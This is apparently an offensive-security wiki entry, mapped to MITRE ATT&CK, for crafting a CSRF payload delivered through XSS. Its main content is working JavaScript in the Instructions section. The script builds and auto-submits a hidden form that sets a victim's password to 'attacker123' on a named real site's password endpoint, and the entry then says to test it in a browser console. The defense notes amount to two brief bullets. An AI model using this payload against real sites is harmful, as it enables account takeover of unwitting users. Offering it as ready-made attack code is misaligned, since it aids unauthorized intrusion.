---
id: afcd443c-91de-4aa3-88f7-72f1ffc8da18
name: Craft CSRF Payload
type: procedure
verified: false
submitted: true
created_at: '2025-12-11T06:10:22.187Z'
updated_at: '2025-12-11T06:10:22.187Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - csrf
  - javascript-payload
commands:
  - '[[commands/fuzz-url-parameter]]'
  - '[[commands/inject-xss-payload]]'
  - '[[commands/test-csrf-endpoint]]'
  - '[[commands/execute-csrf-payload]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
---

# Craft CSRF Payload

## Summary

This procedure creates a JavaScript payload to trigger CSRF requests, such as changing passwords on vulnerable endpoints.

## Description

Develop JS that sends POST requests to the target endpoint, exploiting missing protections. This is used in conjunction with XSS for delivery, targeting web apps with outcomes like unauthorized modifications.

## Requirements

1. Known vulnerable endpoint
2. JavaScript knowledge
3. Testing environment

## Defense

Defensive measures and detection strategies:

- Validate referer headers
- Monitor for anomalous POST requests

## Objectives

1. Create functional CSRF-triggering JS
2. Test payload execution
3. Ensure compatibility with XSS injection

## Instructions

### Step 1: Develop JS Payload

**Context**: Write script to send the request.

**Command** ([[commands/execute-csrf-payload]]):
```javascript
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://www.tiktok.com/api/password/set';
var input = document.createElement('input');
input.name = 'new_password';
input.value = 'attacker123';
form.appendChild(input);
document.body.appendChild(form);
form.submit();
```

> This creates and submits a hidden form.

### Step 2: Test Payload

**Context**: Execute in a browser console.

**Command** ([[commands/execute-csrf-payload]]):
```javascript
// Paste the above JS into console
```

> Verify the request is sent and action performed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/execute-csrf-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[commands/test-csrf-endpoint]]
- [[javascript-payload]]
